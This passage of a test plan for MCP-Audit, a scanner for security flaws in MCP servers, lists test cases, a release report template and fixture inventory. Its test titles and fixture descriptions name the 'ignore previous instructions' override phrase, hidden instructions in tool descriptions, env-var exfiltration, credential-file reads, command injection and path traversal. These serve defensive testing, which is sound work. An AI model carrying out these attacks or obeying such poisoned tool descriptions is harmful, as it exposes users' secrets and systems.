| TC-OUT-001 | Console summary table format | Verify console output displays summary table with check names, status icons, and finding counts | Any fixture with findings | `ScanResult` with mixed findings | Snapshot matches expected table format | FR-100, AC-08 | Integration |
| TC-OUT-002 | Colour coding -- critical findings red | Verify critical findings are rendered with red ANSI codes | Fixture with critical finding | `ScanResult` with critical finding | Output contains red ANSI escape codes around critical finding text | FR-101 | Unit |
| TC-OUT-003 | Colour coding -- high findings yellow | Verify high findings use yellow | Fixture with high finding | `ScanResult` | Output contains yellow ANSI codes | FR-101 | Unit |
| TC-OUT-004 | Colour coding -- medium findings cyan | Verify medium findings use cyan | Fixture with medium finding | `ScanResult` | Output contains cyan ANSI codes | FR-101 | Unit |
| TC-OUT-005 | `--no-color` disables ANSI codes | Verify no ANSI escape codes in output when `--no-color` is passed | Any fixture | Scan with `--no-color` | Output contains zero ANSI escape sequences | FR-101 | Unit |

### 9.2 JSON Output

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-OUT-006 | JSON output is valid JSON | Verify output parses as valid JSON | Any fixture | `--output=json` | `JSON.parse()` succeeds | FR-102, AC-09 | Integration |
| TC-OUT-007 | JSON output matches schema | Verify JSON output contains all required fields: meta, summary, findings | Any fixture | `ScanResult` | Output matches `JsonOutput` interface (all required fields present, correct types) | FR-102, AC-09 | Unit |
| TC-OUT-008 | JSON meta contains correct fields | Verify meta.version, meta.timestamp (ISO 8601), meta.target, meta.targetType, meta.durationMs, meta.analyzersRun | Any fixture | `ScanResult` | All meta fields present and correctly typed | FR-102 | Unit |
| TC-OUT-009 | JSON findings array structure | Verify each finding in JSON has id, type, severity, title, description, recommendation | Fixture with findings | `ScanResult` with findings | Each finding object has all required fields | FR-102 | Unit |
| TC-OUT-010 | JSON output -- empty findings | Verify JSON output for clean scan has empty findings array | Clean fixture | Clean scan result | `findings: []`, `summary.score: 100` | FR-102 | Unit |

---

## 10. Test Cases -- Epic 5: Configuration

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CFG-001 | Load config from default location | Verify config loaded from `./mcp-audit.config.json` when present | Config file in CWD | Scan command without `--config` | Config values applied (e.g., disabled analyzer is skipped) | FR-110 | Integration |
| TC-CFG-002 | Load config from custom path | Verify `--config` flag loads from specified path | Config file at custom path | `--config=/path/to/custom.json` | Config loaded from custom path | FR-110 | Unit |
| TC-CFG-003 | CLI flags override config values | Verify CLI `--checks` overrides config file `checks` setting | Config enables all analyzers; CLI limits to two | `--checks=poisoning,injection` | Only poisoning and injection analyzers run | FR-111 | Integration |
| TC-CFG-004 | Config supports analyzer enable/disable | Verify individual analyzers can be disabled via config | Config with `authentication.enabled: false` | Scan with config | Authentication analyzer does not run | FR-112 | Unit |
| TC-CFG-005 | Config supports severity thresholds | Verify `scoring.failOn` and `scoring.warnOn` thresholds work | Config with `failOn: 'critical'` | Scan with high findings but no critical | Exit code 0 (pass), not 1 | FR-112 | Unit |
| TC-CFG-006 | Config supports allowlist | Verify allowlist entries in config suppress matching findings | Config with allowlist entry | Scan producing finding matching allowlist | Finding suppressed | FR-112, FR-93 | Unit |
| TC-CFG-007 | `init` command generates default config | Verify `mcp-audit init` creates `mcp-audit.config.json` in CWD | No config file in CWD | `mcp-audit init` | File created; contents match default schema from TAD Section 7.3 | FR-05 | Integration |
| TC-CFG-008 | Missing config file -- uses defaults | Verify scan works with defaults when no config file exists | No config file in CWD | Scan without config | All analyzers enabled; weighted-sum scoring; console output | FR-110 | Unit |
| TC-CFG-009 | Malformed config file -- graceful error | Verify scan handles invalid JSON in config | Config file with invalid JSON | Scan | Exit code 2; clear error message about invalid config | NFR-09 | Unit |

---

## 11. Security Test Cases

These test cases verify that MCP-Audit itself does not introduce security vulnerabilities, per TAD Section 9.

| TC ID | Title | Description | Threat (TAD Section 9.1) | Preconditions | Expected Result | Priority | Type |
|-------|-------|-------------|--------------------------|---------------|-----------------|----------|------|
| SEC-001 | Scanned code is never executed | Verify the codebase contains no `require()`, `import()`, `eval()`, `Function()`, or `vm.runInContext()` calls that operate on scanned package content. Scan the source code of mcp-audit itself for these patterns and confirm they do not reference scanned file paths. Additionally, run a scan against a fixture that contains a malicious `index.js` with a side effect (writes a marker file on require) and verify the marker file is never created | Scanned code execution | Fixture: `injection-server/index.js` writes marker file when executed | (1) No require/import/eval of scanned content in source. (2) Marker file does not exist after scan | **Critical** | Unit + Integration |
| SEC-002 | Temp directory cleanup | Verify that after scanning an npm package, no temp directories remain under `os.tmpdir()` matching the `mcp-audit-*` pattern. Test on normal exit, error exit, and SIGINT | Temp directory residue | npm package scan | Zero `mcp-audit-*` directories in temp after scan | High | Integration |
| SEC-003 | Path traversal protection in resolver | Verify that a malicious package containing files with `../../` path components cannot escape the scan root directory. Create a fixture tarball with `../../etc/passwd` path and verify the resolver rejects or normalises it | Path traversal in scanned package | Fixture tarball with traversal paths | Path is rejected or resolved within scan root; no file read outside temp dir | High | Unit |
| SEC-004 | ReDoS resistance in pattern regexes | Verify all regexes in `data/patterns/*.json` do not exhibit catastrophic backtracking. For each regex, test with a known ReDoS input string (e.g., repeated characters that could trigger exponential matching). Execution must complete within 100ms per regex | Regex ReDoS | All pattern files | Every regex completes evaluation of adversarial input within 100ms | Medium | Unit |
| SEC-005 | Output injection -- terminal escape sequences | Verify that finding evidence containing ANSI escape sequences (e.g., `\x1b[2J` screen clear, `\x1b]2;` title change) is sanitised before rendering to console. Create a fixture where a tool description contains escape sequences and verify they are stripped from output | Output injection | Fixture with ANSI escape codes in tool description | Escape sequences stripped; output does not contain raw ANSI control codes from scanned content | Medium | Unit |
| SEC-006 | npm tarball integrity verification | Verify that the npm resolver checks the integrity hash (shasum/SHA-512) of downloaded tarballs against the value from registry metadata. Provide a mocked tarball with an incorrect hash and verify the scan fails with an integrity error | npm tarball manipulation | msw mock returning mismatched tarball hash | Scan fails with integrity verification error; does not proceed to analyse corrupted tarball | High | Integration |

---

## 12. Performance Test Cases

| TC ID | Title | Description | Preconditions | Input | Target | PRD Req | Type |
|-------|-------|-------------|---------------|-------|--------|---------|------|
| PERF-001 | Small server scan time | Verify scan completes within 10 seconds for a server with < 50 source files | Fixture with 30 source files, all analyzers enabled | Local directory scan | Duration < 10,000ms | NFR-01 | Integration |
| PERF-002 | Large server scan time | Verify scan completes within 30 seconds for a server with 50-200 source files | Fixture with 100 source files | Local directory scan | Duration < 30,000ms | NFR-02 | Integration |
| PERF-003 | Memory usage under 512 MB | Verify peak memory usage does not exceed 512 MB during a large scan | Fixture with 200 source files | Local directory scan | `process.memoryUsage().heapUsed < 512 * 1024 * 1024` | TAD Section 13.1 | Integration |
| PERF-004 | npm resolution time | Verify npm package resolution (metadata fetch + tarball download) completes within 5 seconds | msw mock with realistic latency (200ms) | npm package resolution | Duration < 5,000ms | TAD Section 13.1 | Integration |
| PERF-005 | AST parsing -- lazy evaluation | Verify that ASTs are not parsed for files that no analyzer inspects | Fixture with non-`.ts`/`.js` files (e.g., `.md`, `.json`) | Mixed file scan | Non-code files have `ast === undefined` after scan | TAD Section 13.3 | Unit |

---

## 13. Regression Test Suite

### 13.1 Regression Protocol

Every bug fix must include a regression test. The protocol is:

1. **Reproduce:** Create a minimal fixture that triggers the bug
2. **Write test:** Add a test case tagged `@regression` that fails without the fix
3. **Fix:** Implement the fix
4. **Verify:** Confirm the regression test passes with the fix applied
5. **Co-locate:** Place the regression test with the most appropriate test type (unit, integration, security)

### 13.2 Regression Test Naming Convention

```
TC-REG-<BUG-ID>: Regression -- <brief description of the bug>
```

Example: `TC-REG-042: Regression -- parser crash on empty tool description`

### 13.3 Initial Regression Candidates

These are anticipated edge cases that should be added to the regression suite during development:

| TC ID | Title | Area | Scenario |
|-------|-------|------|----------|
| TC-REG-001 | Parser handles empty tool description | Parser | `server.tool('name', '', schema, handler)` -- empty description string should not crash |
| TC-REG-002 | Scorer handles zero findings from all analyzers | Scoring | All analyzers return empty arrays -- score should be 100, not NaN or undefined |
| TC-REG-003 | Resolver handles npm 404 | Resolver | npm registry returns 404 for non-existent package -- should produce exit code 2 with clear message |
| TC-REG-004 | Console formatter handles finding with no file/line | Output | Finding without `file` or `line` properties -- should render without crash |
| TC-REG-005 | Config loader handles UTF-8 BOM | Config | Config file with UTF-8 BOM -- should parse correctly |
| TC-REG-006 | Aggregator handles duplicate findings from overlapping analyzers | Aggregator | Two analyzers produce identical finding (same type, file, line) -- should deduplicate |

---

## 14. Bug Severity & Priority Classification

### 14.1 Severity Levels

| Severity | Definition | Example |
|----------|-----------|---------|
| **S1 -- Critical** | The tool crashes, produces incorrect security assessment, or introduces a security vulnerability | Scanned code executed; score calculated incorrectly; crash on valid input |
| **S2 -- High** | A major feature does not work, but the tool does not crash. Findings are missing or incorrect for an entire analyzer category | Tool poisoning analyzer returns zero findings for all patterns; JSON output is malformed |
| **S3 -- Medium** | A feature works partially, or a minor feature is broken. Some findings may be missing or have wrong severity | One pattern in poisoning not detected; colour coding wrong for one severity level |
| **S4 -- Low** | Cosmetic issues, minor UX problems, documentation errors | Spinner text slightly misaligned; typo in recommendation text |

### 14.2 Priority Levels

| Priority | Definition | Response Time |
|----------|-----------|---------------|
| **P1 -- Blocker** | Blocks release. Must be fixed before any release tag | Immediate |
| **P2 -- High** | Must be fixed in the current milestone | Within current sprint |
| **P3 -- Medium** | Should be fixed in the next milestone | Next sprint |
| **P4 -- Low** | Fix when convenient; may be deferred | Backlog |

### 14.3 Severity-Priority Matrix

| | P1 Blocker | P2 High | P3 Medium | P4 Low |
|---|-----------|---------|-----------|--------|
| **S1 Critical** | Fix immediately | Fix before release | -- | -- |
| **S2 High** | Fix before release | Fix in milestone | Defer with justification | -- |
| **S3 Medium** | -- | Fix in milestone | Next milestone | Backlog |
| **S4 Low** | -- | -- | Next milestone | Backlog |

---

## 15. Test Summary Report Template

The following template must be completed before each release tag and attached to the release PR.

```markdown
# Test Summary Report -- MCP-Audit v<VERSION>

**Date:** YYYY-MM-DD
**Test Plan Version:** 0.1.0
**Tested By:** <Name / AI Agent>
**Environment:** Node.js <version>, <OS>

## 1. Execution Summary

| Metric | Value |
|--------|-------|
| Total test cases | |
| Passed | |
| Failed | |
| Skipped | |
| Blocked | |
| Pass rate | |

## 2. Coverage Summary

| Module | Line Coverage | Target | Status |
|--------|--------------|--------|--------|
| Overall | | >= 80% | |
| src/scoring/ | | 100% | |
| src/scanner/aggregator.ts | | 100% | |
| src/analyzers/tool-poisoning/ | | >= 80% | |
| src/analyzers/command-injection/ | | >= 80% | |
| src/analyzers/dependency/ | | >= 80% | |
| src/analyzers/network/ | | >= 80% | |
| src/analyzers/filesystem/ | | >= 80% | |
| src/analyzers/authentication/ | | >= 80% | |

## 3. CI Matrix Results

| OS | Node 20 | Node 22 |
|----|---------|---------|
| ubuntu-latest | | |
| macos-latest | | |
| windows-latest | | |

## 4. Security Test Results

| TC ID | Title | Status |
|-------|-------|--------|
| SEC-001 | Scanned code never executed | |
| SEC-002 | Temp directory cleanup | |
| SEC-003 | Path traversal protection | |
| SEC-004 | ReDoS resistance | |
| SEC-005 | Output injection sanitisation | |
| SEC-006 | npm tarball integrity | |

## 5. Performance Benchmark Results

| TC ID | Target | Actual | Status |
|-------|--------|--------|--------|
| PERF-001 | < 10s | | |
| PERF-002 | < 30s | | |
| PERF-003 | < 512 MB | | |
| PERF-004 | < 5s | | |

## 6. Open Bugs

| Bug ID | Severity | Priority | Summary | Status |
|--------|----------|----------|---------|--------|
| | | | | |

## 7. Exit Criteria Checklist

| Criterion | Met? |
|-----------|------|
| All test cases pass on all CI matrix combinations | |
| Line coverage >= 80% overall | |
| Line coverage = 100% on scoring + aggregator | |
| Zero S1/S2 open bugs | |
| All security tests pass | |
| Performance benchmarks pass | |
| All AC-01 through AC-14 have passing tests | |
| No regression failures | |

## 8. Recommendation

[ ] RELEASE -- all exit criteria met
[ ] HOLD -- exit criteria not met (see open bugs / failing tests above)

## 9. Sign-Off

| Role | Name | Date | Signature |
|------|------|------|-----------|
| SDET | | | |
| Developer | | | |
```

---

## Appendix A -- Test Fixture Inventory

The following test fixtures must be created in `tests/fixtures/` before testing can begin:

| Fixture Directory | Purpose | Contains |
|-------------------|---------|----------|
| `clean-server/` | MCP server with zero security issues | Valid `server.tool()` registrations, normal descriptions, no injection sinks, auth configured |
| `poisoned-server/` | MCP server with tool poisoning patterns | Tools with hidden instructions, excessive description length, description-implementation mismatch |
| `injection-server/` | MCP server with injection vulnerabilities | `exec()` with user input, SQL concatenation, path traversal, template literal injection |
| `exfiltration-server/` | MCP server with data exfiltration patterns | `fetch()` sending `process.env` to external URL, undisclosed network calls |
| `chained-server/` | MCP server with co-located findings for scoring tests | Single handler with both injection sink AND exfiltration, poisoning AND injection |
| `minimal-server/` | Minimal valid MCP server (single tool, no issues) | Smallest possible valid MCP server structure |
| `malformed-server/` | Server with syntax errors and missing files | Broken TypeScript files, missing package.json, invalid tool registrations |
| `large-server/` | Server with 100+ source files for performance benchmarks | Generated fixture with many files, realistic code patterns |
| `auth-missing-server/` | Server with no authentication configuration | Tools exposed without any auth mechanism |
| `sensitive-access-server/` | Server accessing sensitive filesystem paths | Handlers reading ~/.ssh, ~/.aws, .env files |

---

## Appendix B -- Test Directory Structure

Per TAD Section 4.1:

```
tests/
├── unit/
│   ├── analyzers/
│   │   ├── tool-poisoning.test.ts      # TC-PSN-001 through TC-PSN-012
│   │   ├── command-injection.test.ts    # TC-INJ-001 through TC-INJ-010
│   │   ├── dependency.test.ts           # TC-DEP-001 through TC-DEP-006
│   │   ├── network.test.ts              # TC-NET-001 through TC-NET-006
│   │   ├── filesystem.test.ts           # TC-FS-001 through TC-FS-006
│   │   └── authentication.test.ts       # TC-AUTH-001 through TC-AUTH-003
│   ├── scoring/
│   │   ├── weighted-sum.test.ts         # TC-SCR-001 through TC-SCR-011
│   │   ├── deduplication.test.ts        # TC-SCR-012 through TC-SCR-014
│   │   └── allowlist.test.ts            # TC-SCR-015, TC-SCR-016
│   ├── scanner/
│   │   ├── parser.test.ts              # TC-CLI-016 through TC-CLI-022
│   │   ├── resolver.test.ts            # TC-CLI-011, TC-CLI-012
│   │   └── aggregator.test.ts          # (dedup + sorting covered in scoring/)
│   ├── output/
│   │   ├── console.test.ts             # TC-OUT-001 through TC-OUT-005
│   │   └── json.test.ts                # TC-OUT-006 through TC-OUT-010
│   ├── config/
│   │   └── config-loader.test.ts       # TC-CFG-001 through TC-CFG-009
│   └── security/
│       ├── no-code-execution.test.ts   # SEC-001 (source code scan portion)
│       ├── path-traversal.test.ts      # SEC-003
│       ├── redos-resistance.test.ts    # SEC-004
│       └── output-injection.test.ts    # SEC-005
├── integration/
│   ├── scan-local.test.ts              # TC-CLI-001, TC-CLI-003, TC-CLI-008
│   ├── scan-npm.test.ts                # TC-CLI-002, TC-CLI-011
│   ├── exit-codes.test.ts              # TC-CLI-008, TC-CLI-009, TC-CLI-010
│   ├── cleanup.test.ts                 # TC-CLI-013, TC-CLI-014, TC-CLI-015, SEC-002
│   ├── output.test.ts                  # TC-OUT-001, TC-OUT-006 (snapshot + schema)
│   ├── security/
│   │   ├── no-code-execution.test.ts   # SEC-001 (marker file portion)
│   │   └── tarball-integrity.test.ts   # SEC-006
│   └── performance/
│       ├── scan-time.test.ts           # PERF-001, PERF-002
│       ├── memory-usage.test.ts        # PERF-003
│       └── resolution-time.test.ts     # PERF-004
└── fixtures/
    ├── clean-server/
    ├── poisoned-server/
    ├── injection-server/
    ├── exfiltration-server/
    ├── chained-server/
    ├── minimal-server/
    ├── malformed-server/
    ├── large-server/
    ├── auth-missing-server/
    └── sensitive-access-server/
```

---

## Appendix C -- Complete Test Case Index

| TC ID | Section | Title | Type |
|-------|---------|-------|------|
| TC-CLI-001 | 6.1 | Scan command accepts local directory path | Integration |
| TC-CLI-002 | 6.1 | Scan command accepts npm package name | Integration |
| TC-CLI-003 | 6.1 | `--checks` flag limits analyzers | Integration |
| TC-CLI-004 | 6.1 | `--output=json` produces JSON output | Integration |
| TC-CLI-005 | 6.1 | `--report` writes output to file | Integration |
| TC-CLI-006 | 6.1 | `checks --list` displays all analyzers | Unit |
| TC-CLI-007 | 6.2 | Progress spinner displays during scan | Integration |
| TC-CLI-008 | 6.3 | Exit code 0 on clean scan | Integration |
| TC-CLI-009 | 6.3 | Exit code 1 on findings above threshold | Integration |
| TC-CLI-010 | 6.3 | Exit code 2 on scan error | Integration |
| TC-CLI-011 | 6.4 | Resolve npm package -- downloads tarball | Integration |
| TC-CLI-012 | 6.4 | Resolve local directory -- scans in place | Unit |
| TC-CLI-013 | 6.4 | Temp directory cleanup on normal exit | Integration |
| TC-CLI-014 | 6.4 | Temp directory cleanup on error | Integration |
| TC-CLI-015 | 6.4 | Temp directory cleanup on SIGINT | Integration |
| TC-CLI-016 | 6.5 | Parse server.tool() pattern | Unit |
| TC-CLI-017 | 6.5 | Parse server.addTool() pattern | Unit |
| TC-CLI-018 | 6.5 | Parse class-based Tool pattern | Unit |
| TC-CLI-019 | 6.5 | Parse resource definitions | Unit |
| TC-CLI-020 | 6.5 | Parse TypeScript source files | Unit |
| TC-CLI-021 | 6.5 | Parse JavaScript source files | Unit |
| TC-CLI-022 | 6.5 | Graceful handling of parse errors | Unit |
| TC-PSN-001 | 7.1 | Flag description exceeding 500 chars | Unit |
| TC-PSN-002 | 7.1 | Flag description exceeding 1000 chars | Unit |
| TC-PSN-003 | 7.1 | Detect "ignore previous instructions" pattern | Unit |
| TC-PSN-004 | 7.1 | Detect data exfiltration keywords | Unit |
| TC-PSN-005 | 7.1 | Detect social engineering phrases | Unit |
| TC-PSN-006 | 7.1 | Detect hidden Unicode/whitespace instructions | Unit |
| TC-PSN-007 | 7.1 | Detect description-implementation discrepancy -- undisclosed network call | Unit |
| TC-PSN-008 | 7.1 | Detect description-implementation discrepancy -- undisclosed file write | Unit |
| TC-PSN-009 | 7.1 | Clean description -- no false positive | Unit |
| TC-PSN-010 | 7.1 | Pattern library loads correctly | Unit |
| TC-PSN-011 | 7.1 | Detect Base64-encoded instruction in description | Unit |
| TC-PSN-012 | 7.1 | Detect multi-tool poisoning chain | Unit |
| TC-INJ-001 | 7.2 | Detect `exec()` with user input | Unit |
| TC-INJ-002 | 7.2 | Detect `execSync()` with user input | Unit |
| TC-INJ-003 | 7.2 | Detect `spawn()` with user input | Unit |
| TC-INJ-004 | 7.2 | Detect template literal in exec | Unit |
| TC-INJ-005 | 7.2 | Detect SQL injection -- string concatenation | Unit |
| TC-INJ-006 | 7.2 | Detect SQL injection -- template literal in raw query | Unit |
| TC-INJ-007 | 7.2 | Detect path traversal -- user input in file path | Unit |
| TC-INJ-008 | 7.2 | Safe exec -- no false positive | Unit |
| TC-INJ-009 | 7.2 | Detect `execFile()` with user input | Unit |
| TC-INJ-010 | 7.2 | Detect `sequelize.query()` with interpolation | Unit |
| TC-DEP-001 | 7.3 | npm audit findings mapped to unified format | Integration |
| TC-DEP-002 | 7.3 | npm audit -- clean package -- no findings | Integration |
| TC-DEP-003 | 7.3 | Typosquatting detection -- edit distance 1 | Unit |
| TC-DEP-004 | 7.3 | Typosquatting detection -- edit distance 2 | Unit |
| TC-DEP-005 | 7.3 | Typosquatting -- no false positive | Unit |
| TC-DEP-006 | 7.3 | npm not available -- graceful fallback | Unit |
| TC-NET-001 | 7.4 | Detect `fetch()` in handler | Unit |
| TC-NET-002 | 7.4 | Detect `axios` / `http.request` call | Unit |
| TC-NET-003 | 7.4 | Detect WebSocket connection | Unit |
| TC-NET-004 | 7.4 | Detect data exfiltration -- env vars to endpoint | Unit |
| TC-NET-005 | 7.4 | Flag undisclosed network access | Unit |
| TC-NET-006 | 7.4 | Disclosed network access -- no false positive | Unit |
| TC-FS-001 | 7.5 | Detect read of `~/.ssh` directory | Unit |
| TC-FS-002 | 7.5 | Detect read of `~/.aws/credentials` | Unit |
| TC-FS-003 | 7.5 | Detect read of `.env` file | Unit |
| TC-FS-004 | 7.5 | Detect path traversal in file operations | Unit |
| TC-FS-005 | 7.5 | Detect write to sensitive location | Unit |
| TC-FS-006 | 7.5 | Normal file operations -- no false positive | Unit |
| TC-AUTH-001 | 7.6 | Flag missing authentication | Unit |
| TC-AUTH-002 | 7.6 | Authentication present -- no finding | Unit |
| TC-AUTH-003 | 7.6 | Partial authentication -- some tools unprotected | Unit |
| TC-SCR-001 | 8.1 | Score = 100 for zero findings | Unit |
| TC-SCR-002 | 8.1 | Score deduction -- single critical | Unit |
| TC-SCR-003 | 8.1 | Score deduction -- single high | Unit |
| TC-SCR-004 | 8.1 | Score deduction -- single medium | Unit |
| TC-SCR-005 | 8.1 | Score deduction -- single low | Unit |
| TC-SCR-006 | 8.1 | Score floor at 0 | Unit |
| TC-SCR-007 | 8.1 | PASS classification | Unit |
| TC-SCR-008 | 8.1 | WARN classification | Unit |
| TC-SCR-009 | 8.1 | FAIL classification | Unit |
| TC-SCR-010 | 8.1 | FAIL on any critical | Unit |
| TC-SCR-011 | 8.1 | Mixed severity -- correct total | Unit |
| TC-SCR-012 | 8.2 | Deduplicate identical findings | Unit |
| TC-SCR-013 | 8.2 | No dedup for different types at same location | Unit |
| TC-SCR-014 | 8.2 | Sort findings by severity | Unit |
| TC-SCR-015 | 8.3 | Allowlisted finding suppressed | Unit |
| TC-SCR-016 | 8.3 | Non-matching allowlist -- no effect | Unit |
| TC-OUT-001 | 9.1 | Console summary table format | Integration |
| TC-OUT-002 | 9.1 | Colour coding -- critical red | Unit |
| TC-OUT-003 | 9.1 | Colour coding -- high yellow | Unit |
| TC-OUT-004 | 9.1 | Colour coding -- medium cyan | Unit |
| TC-OUT-005 | 9.1 | `--no-color` disables ANSI | Unit |
| TC-OUT-006 | 9.2 | JSON output is valid JSON | Integration |
| TC-OUT-007 | 9.2 | JSON output matches schema | Unit |
| TC-OUT-008 | 9.2 | JSON meta contains correct fields | Unit |
| TC-OUT-009 | 9.2 | JSON findings array structure | Unit |
| TC-OUT-010 | 9.2 | JSON output -- empty findings | Unit |
| TC-CFG-001 | 10 | Load config from default location | Integration |
| TC-CFG-002 | 10 | Load config from custom path | Unit |
| TC-CFG-003 | 10 | CLI flags override config | Integration |
| TC-CFG-004 | 10 | Config analyzer enable/disable | Unit |
| TC-CFG-005 | 10 | Config severity thresholds | Unit |
| TC-CFG-006 | 10 | Config allowlist | Unit |
| TC-CFG-007 | 10 | `init` generates default config | Integration |
| TC-CFG-008 | 10 | Missing config -- uses defaults | Unit |
| TC-CFG-009 | 10 | Malformed config -- graceful error | Unit |
| SEC-001 | 11 | Scanned code never executed | Unit + Integration |
| SEC-002 | 11 | Temp directory cleanup | Integration |
| SEC-003 | 11 | Path traversal protection in resolver | Unit |
| SEC-004 | 11 | ReDoS resistance in pattern regexes | Unit |
| SEC-005 | 11 | Output injection sanitisation | Unit |
| SEC-006 | 11 | npm tarball integrity verification | Integration |
| PERF-001 | 12 | Small server scan time (< 10s) | Integration |
| PERF-002 | 12 | Large server scan time (< 30s) | Integration |
| PERF-003 | 12 | Memory usage < 512 MB | Integration |
| PERF-004 | 12 | npm resolution time (< 5s) | Integration |
| PERF-005 | 12 | AST parsing -- lazy evaluation | Unit |
| TC-REG-001 | 13 | Parser handles empty tool description | Regression |
| TC-REG-002 | 13 | Scorer handles zero findings | Regression |
| TC-REG-003 | 13 | Resolver handles npm 404 | Regression |
| TC-REG-004 | 13 | Console formatter -- finding with no file/line | Regression |
| TC-REG-005 | 13 | Config loader handles UTF-8 BOM | Regression |
| TC-REG-006 | 13 | Aggregator deduplicates overlapping analyzer output | Regression |

**Total test cases:** 100

---

*This document was created with AI assistance (Claude Opus 4.6, P-05 SDET persona). It must be reviewed and approved by the Project Owner before test implementation begins.*
